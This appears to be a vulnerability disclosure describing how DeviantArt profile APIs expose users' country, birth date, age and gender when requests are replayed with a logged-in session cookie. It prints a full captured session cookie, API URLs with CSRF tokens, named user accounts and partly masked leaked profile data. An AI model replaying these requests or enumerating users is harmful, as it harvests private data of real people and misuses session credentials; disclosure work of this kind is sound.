# About DeviantArt Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie: _pxvid=e4acfaa6-ecf3-11ee-be05-7d83d8babacd; g_state={"i_l":0}; auth_secure=__bea9d1146cd16109afc2%3B%226ed30eb33350136494e9e3b45f271470%22; userinfo=__2f5c8815408eeb61b3c9%3B%7B%22username%22%3A%22QMZHN%22%2C%22uniqueid%22%3A%2223b565bd0e762f7cd75659094fc56487%22%2C%22dvs9-1%22%3A1%2C%22ab%22%3A%22tao-nf2-1-a-8%22%7D; auth=__a70aa9491e325b0fe111%3B%22feb204ea67776eb4994989188d2e357a%22; td=0:1737%3B3:1077%3B6:1301x736%3B7:1777%3B10:1077%3B11:536%3B12:1857x1004%3B21:634%3B22:600
```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: Country, age, date of birth, gender, personal website, etc.

> Request method: GET, information can be obtained by traversing the constructed username, such as "koriarredondo", "Elka0815","shiosss"...

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params|
|-|---|--|
|koriarredondo|https://www.deviantart.com/_puppy/dauserprofile/init/about?username=koriarredondo&csrf_token=tNnhgu02LdlrC1WT.sbcdyw.Uj3DmWtqpUy-dIINHK-fHLfouuup8z8XO-EpluONyRQ&da_minor_version=20230710|username=koriarredondo|
|shiosss|https://www.deviantart.com/_puppy/dashared/user/info?username=shiosss&expand=user.stats%2Cuser.profile%2Cuser.watch&csrf_token=mRd-mp-KHjKyyHJj.sb23j3.VDWeOXZVJAA2jwIehgD9t_OFtdksipKgjospygSXZMU&da_minor_version=20230710|username=shiosss|


### Leaked packet cases 
shiosss:
``` {
 "username": "shiosss",
 "country": "****",
 "countryId": *
 "countrycode": "**",
 "age": null,
 "dobYear": null,
 "dobMonth": **,
 "dobDay": *,
 "deviantFor": 484826,
 "isArtist": false,
 "level": 0,
 "specialty": 0,
 "website": "",
 "websiteLabel": null,
 "tagline": "Shion Yg",
 "twitterUsername": null,
 "gender": "******",
 "isOpenForCommissions": false,
 "hasActiveCommissions": false,
 "showBadges": true,
 "interests": [],
 "badges": [],
 "socialLinks": [],
 "mutualWatchedUsers": [],
 "mutualWatchedUsersCount": 0,
```
koriarredondo:
``` {
 "username": "KoriArredondo",
 "country": "*****",
 "countryId": 1**,
 "countrycode": "**",
 "age": **,
 "dobYear": 1***,
 "dobMonth": *,
 "dobDay": **,
 "deviantFor": 430708777,
 "isArtist": true,
 "level": 3,
 "specialty": 3,
 "website": "",
 "websiteLabel": "",
 "tagline": "",
 "twitterUsername": null,
 "gender": "****",
 "isOpenForCommissions": false,
 "hasActiveCommissions": false,
 "showBadges": false,
```
